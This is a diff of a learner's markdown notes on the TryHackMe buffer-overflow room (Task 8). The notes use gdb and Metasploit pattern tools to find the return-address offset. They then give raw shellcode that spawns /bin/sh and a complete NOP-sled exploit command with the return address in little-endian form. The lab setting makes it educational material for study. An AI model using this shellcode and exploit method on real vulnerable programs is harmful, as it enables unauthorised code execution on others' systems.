@@ -498,42 +498,101 @@ int main(int argc, char **argv)
 	`python -c "print('\90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde') | ./program-name"
 	- lol `deadbeef` ^ 
 	- There can be cases where you need to pass xargs before the ./prrogram-name
-- oof. After a while I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)
-	- https://l1ge.github.io/tryhackme_bof1/ **(thanks bud!!!!!!! - real good writeup, great for learning - check this out, for sure.)**
-		- The use of `gdb` is real
-			- `gdb program-name`
-			- Finding out how many characters/bytes the program can handle (for the context of this particular module/scenario - also a handy command to know - pretty much the first time I also am using gdb - like the writeup above)
-			- `(gdb) run $(python -c "print('A'*140)")`
-				- See the outcomes you get, what can be accepted or is 'normal' and what isn't
-				- The tactic here is to find out where the base-point `rbp` is and also where the return address starts and finishes. Also how big these addresses are (how many bytes in size - again the writeup covers this so I won't rewrite what is written, read it up, real good)
-			-  -----------
-			- *144 characters
-			- ***Inferior 1 (process 13411) exited normally***
-			- -----------
-			- *145 characters*
-			- ***0x0000000000000000 in ?? ()****
-			- -----------
-			- *This started with **146 to 151** characters*
-			- ***0x0000000000400595 in main ()***
-			- *Is this rbp?*
-			- -----------
-			- *152 characters*
-			- ***0x0000000000400500 in do_global_dtors_aux ()***
-			- *This can be considered the START of the RETURN ADDRESS*
-			-  -----------
-			- *153 characters*
-			- ***0x0000000000400041 in ?? ()***
-			- -----------
-			- *158*
-			- ***0x0000414141414141 in ?? ()***
-			- *6-bytes*
-			- *END of the RETURN ADDRESS*
-			- -----------
-			- ***159***
-			- ***0x0000000000400563 in copy_arg ()***
-			- -----------
-			- See the patterns being created there, we know (since we have access to the source code in this instance - which won't be the case otherwise...) that the buffer goes from 0-140. 
-				- Seems like there are six-bytes that are kept for the return address, which starts to get the overflow of the character "A" (x/41) from 152/153 onwards to 158 characters being input to the program
-- Metasploit can be used as well to generate a random length pattern to confirm if the return address we identified above is accurate or not
-- `(gdb) i r`
-	- To view the registers :) 
+- *oof. After a while I had to look up some additional information because my knowledge-set with debugging and with C is very limited at this stage (if even existent!)*
+---
+**This entire part here is workings alongside the following write-up for https://tryhackme.com/room/bof1 - Task 8**
+
+- https://l1ge.github.io/tryhackme_bof1/ **(thanks bud!!!!!!! - real good writeup, great for learning - check this out, for sure.)**
+	- The use of `gdb` is real
+		- `gdb program-name`
+		- Finding out how many characters/bytes the program can handle (for the context of this particular module/scenario - also a handy command to know - pretty much the first time I also am using gdb - like the writeup above)
+		- `(gdb) run $(python -c "print('A'*140)")`
+			- See the outcomes you get, what can be accepted or is 'normal' and what isn't
+			- The tactic here is to find out where the base-point `rbp` is and also where the return address starts and finishes. Also how big these addresses are (how many bytes in size - again the writeup covers this so I won't rewrite what is written, read it up, real good)
+		-  -----------
+		- *144 characters
+		- ***Inferior 1 (process 13411) exited normally***
+		- -----------
+		- *145 characters*
+		- ***0x0000000000000000 in ?? ()****
+		- -----------
+		- *This started with **146 to 151** characters*
+		- ***0x0000000000400595 in main ()***
+		- *Is this rbp?* 
+		- -----------
+		- *152 characters*
+		- ***0x0000000000400500 in do_global_dtors_aux ()***
+		- *This can be considered the START of the RETURN ADDRESS*
+		-  -----------
+		- *153 characters*
+		- ***0x0000000000400041 in ?? ()***
+		- -----------
+		- *158*
+		- ***0x0000414141414141 in ?? ()***
+		- *6-bytes*
+		- *END of the RETURN ADDRESS*
+		- -----------
+		- ***159***
+		- ***0x0000000000400563 in copy_arg ()***
+		- -----------
+		- See the patterns being created there, we know (since we have access to the source code in this instance - which won't be the case otherwise...) that the buffer goes from 0-140. 
+			- Seems like there are six-bytes that are kept for the return address, which starts to get the overflow of the character "A" (x/41) from 152/153 onwards to 158 characters being input to the program
+	- Metasploit to double-check the above findings:
+		- Metasploit can be used as well to generate a random length pattern to confirm if the return address we identified above is accurate or not
+		- Generate some a pattern of random length with the `pattern_create.rb` tool from the MSF (Metasploit Framework)
+			- Going with a 200 byte pattern in this instance as per that write-up (so not quite random, but 200)
+			- `/usr/share/metasploit-framework/tools/exploit/pattern_create-rb -l 200`
+			- Copy the given pattern
+			- run it in `(dbg)`
+				- We've gotten a segmentation fault
+				- Let's look at what `rbp` register has in it
+					- `(gdb) i r`
+						- Shows all registers :) 
+				- `rbp` in this exercise has been overridden with the pattern we gave it (I don't see the resemblance - but will look at this more carefully)
+			- Check the value that `rbp` has with MSF's `pattern_offset.rb` tool (don't forget to do an `-h` on various tools programs if you want to know more :) )
+				- `../../../../../pattern-offset.rb -q <rbp-value>`
+					- Exact match at offset 144
+				- `rbp` having a size of 8bytes
+					- 144+8 = 152
+				- The offset found above is confirmed. 
+	- Picking a Shell Code
+		- Refer to l1ge's write-up above. 
+			-   *(one day, I will write my own! Har!)*
+			- *Although some of the stuff here, a lot of it, is my own .. But like an actual formal one :)*
+			- `\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05`
+			- Run this `dbg`
+			- `(dbg) python -c "print('A'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6")`
+			- Examine the dump of the code with 
+				- `(dbg) x/100x $rsp-200`
+					- Dumps 100\*4 bytes from memory location of $rsp-200 bytes
+				- Take note of what is displayed and the code that was run above.
+`0x7fffffffe2a8: 0x41414141   0x41414141   0x41414141   0x48583b6a`
+				- You'll take note that the memory address at `0x7fffffffffe2a8` is where the shellcode injection resides, but in the fourth column
+					- This is the address of the first column on this line (currently with the A's/41s that we gave it earlier)
+					- Our shellcode is three columns further in
+					- We'll need to add 3\*4=12 bytes to `0x7fffffffffe2a8`
+					- 12 in hex is `0xC`
+					- `0x7fffffffffe2a8` + 0xC which comes out to `0x7fffffffffe2b4`
+					- This is the exact address of where the shell code starts in the buffer
+			- As per THM's instruction earlier above, memory can shift a bit sometimes, from one execution to the next. Use of NOPs will be required
+				- Injecting NOPs will mean that we won't need to get the exact address of where the Shellcode starts, any address in NOPS will do
+				- The program will skip all NOPs and execute the shellcode
+			- Replace the first set of A's with NOPs (`\x90`)
+			- Check in dbg again
+				- `(dbg) x/100x $rsp-200`
+				- Pick any address as long as NOPs are in it
+					- `0x7fffffffe298`
+				- Convert that address to Little Endian
+					- `0x98e2ffffff7f`
+				- And to:
+					- `\x98\xe2\xff\xff\xff\x7f`
+				- Replace the last `6*B` part in the above command with the above memory address and voila!!!!! 
+`./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")`
+- Thanks  l1ge :) 
+	- There is a huge but in Task 8 though. 
+	- Albeit that we were able to pop a shell out of the buffer overflow exploit we did.... We're still User1. The secret.txt file is owned by User2. Great.
+	- tbc
+
+---
+
+
